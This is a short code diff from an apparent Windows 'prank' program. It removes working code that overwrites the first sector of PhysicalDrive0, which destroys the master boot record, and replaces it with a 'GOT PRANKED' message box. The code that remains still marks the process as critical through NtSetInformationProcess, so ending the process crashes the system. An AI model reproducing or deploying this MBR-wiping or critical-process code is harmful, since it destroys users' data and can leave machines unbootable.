@@ -69,12 +69,7 @@ int WINAPI WinMain(HINSTANCE hInstance,
 
 				//status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
 				status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
-				char mbrData[512];
-				ZeroMemory(&mbrData, (sizeof mbrData));
-				HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
-				DWORD write;
-				WriteFile(MBR, mbrData, 512, &write, NULL);
-				CloseHandle(MBR);
+				MessageBoxA(NULL, "You just GOT PRANKED", "YOU JUST GOT PRANKED!", MB_ICONHAND);
 				ShellExecuteA(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOW);
 				//HANDLE thread = CreateThread(NULL, 0, &WatchdogThread, NULL, 0, NULL);
 				Sleep(2000);
